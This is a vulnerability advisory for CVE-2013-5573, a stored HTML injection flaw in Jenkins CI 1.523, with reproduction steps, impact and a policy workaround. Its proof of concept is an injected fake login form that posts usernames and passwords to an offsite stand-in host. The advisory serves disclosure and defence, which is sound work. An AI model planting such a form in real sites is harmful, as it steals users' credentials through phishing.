@@ -1,0 +1,114 @@
+###################################################
+
+01. ###  Advisory Information ###
+
+Title: Default markup formatter permits offsite-bound forms
+Date published : 2013-12-16
+Date of last update: 2013-12-16
+Vendors contacted : Jenkins CI v 1.523
+Discovered by: Christian Catalano
+Severity: Low
+
+
+02. ###  Vulnerability Information ###
+
+CVE reference: CVE-2013-5573
+CVSS v2 Base Score: 4.7
+CVSS v2 Vector : (AV:N/AC:L/Au:M/C:P/I:P/A:N)
+Component/s : Jenkins CI v 1.523
+Class : HTML Injection
+
+
+03. ### Introduction ###
+
+Jenkins CI is an extendable open source continuous integration server 
+http://jenkins-ci.org.
+
+
+04. ### Vulnerability Description ###
+
+The default installation and configuration of Jenkins CI is prone to a 
+security vulnerability. The Jenkins CI default markup formatter permits 
+offsite-bound forms. This vulnerability could be exploited by a remote 
+attacker (a malicious user) to inject malicious persistent HTML script 
+code (application side).
+
+
+05. ### Technical Description / Proof of Concept Code ###
+
+The vulnerability is located in the 'Descriotion' input field of the 
+User Configuration  function:
+
+https://localhost:9444/jenkins/user/attacker/configure
+
+To reproduce the vulnerability,  the attacker (a malicious user) can add 
+the malicious HTML script code:
+
+<form method="POST" action="http://www.mocksite.org/login/login.php.">
+Username: <input type="text" name="username" size="15" /><br />
+Password: <input type="password" name="passwort" size="15" /><br />
+<div align="center">
+<p><input type="submit" value="Login" /></p>
+</div>
+</form>
+
+in the 'Descriotion' input field and click on save button.
+The code execution happens when the victim (an unaware user) view the 
+'People List'
+
+https://localhost:9444/jenkins/asynchPeople/
+
+and click on attacker user id.
+
+
+06. ### Business Impact ###
+
+Exploitation of the persistent web vulnerability requires a low 
+privilege web application user account.
+Successful exploitation of the vulnerability results in persistent 
+phishing and persistent external redirects.
+
+
+07. ### Systems Affected ###
+
+
+This vulnerability was tested against:
+Jenkins CI v1.523
+Older versions are probably affected too, but they were not checked.
+
+
+08. ### Vendor Information, Solutions and Workarounds ###
+
+Currently, there are no known upgrades or patches to correct this 
+vulnerability. It is possible to temporarily mitigate the flaw by 
+implementing the following workaround:
+'MyspacePolicy' permits
+tag("form", "action", ONSITE_OR_OFFSITE_URL,
+             "method");
+
+Fix 'MyspacePolicy' by restricting the policy to ONSITE_URL only or 
+perhaps <form> could be banned entirely.
+
+
+09. ### Credits ###
+
+This vulnerability has been discovered by:
+Christian Catalano aka wastasy ch(dot)catalano(at)gmail(dot)com
+
+
+10.  ### Vulnerability History ###
+
+August   21th, 2013: Vulnerability identification
+August    4th, 2013: Vendor notification [Jenkins CI]
+November 19th, 2013: Vulnerability confirmation [Jenkins CI]
+November 19th, 2013: Vendor Solution
+December 16th, 2013: Vulnerability disclosure
+
+11. ### Disclaimer ###
+
+The information contained within this advisory is supplied "as-is" with 
+no warranties or guarantees of fitness of use or otherwise.
+I accept no responsibility for any damage caused by the use or misuse of 
+this information.
+
+###################################################
